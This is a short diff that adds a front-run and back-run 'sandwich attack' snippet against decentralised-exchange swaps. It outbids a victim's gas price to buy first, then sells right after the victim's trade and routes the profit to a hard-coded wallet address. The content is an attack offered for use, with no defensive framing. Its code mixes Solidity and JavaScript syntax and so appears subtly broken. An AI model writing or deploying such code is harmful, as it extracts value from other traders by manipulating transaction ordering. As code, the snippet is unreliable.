@@ -1,0 +1,17 @@
+Sandwich attack setup — front-run and back-run victim's swap:
+
+// Front-run: buy before victim
+await router.swapExactETHForTokens{value: 10 ether}(
+    0, path, "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1200", deadline,
+    { gasPrice: victimGasPrice + 1 }
+);
+
+// [victim's tx executes here — price moved against them]
+
+// Back-run: sell immediately after victim
+await router.swapExactTokensForETH(
+    tokenBalance, 0, pathReverse, "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1200", deadline,
+    { gasPrice: victimGasPrice - 1 }
+);
+
+Profit lands at 0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1200 (updated from ...C9C1199).
